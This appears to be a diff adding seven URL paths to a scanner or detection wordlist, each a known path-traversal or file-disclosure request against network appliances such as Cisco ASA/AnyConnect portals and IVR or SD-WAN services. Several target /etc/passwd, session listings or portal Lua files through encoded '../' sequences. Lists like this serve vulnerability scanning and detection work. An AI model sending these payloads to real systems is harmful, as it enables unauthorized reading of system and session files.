@@ -1,0 +1,7 @@
+/adm/file.cgi?next_file=%2fetc%2fpasswd
+/ccmivr/IVRGetAudioFile.do?file=../../../../../../../../../../../../../../../etc/passwd
+/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions
+/cgi-bin/config.exp
+/dataservice/disasterrecovery/download/token/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2Fetc%2Fpasswd
+/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../
+/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua
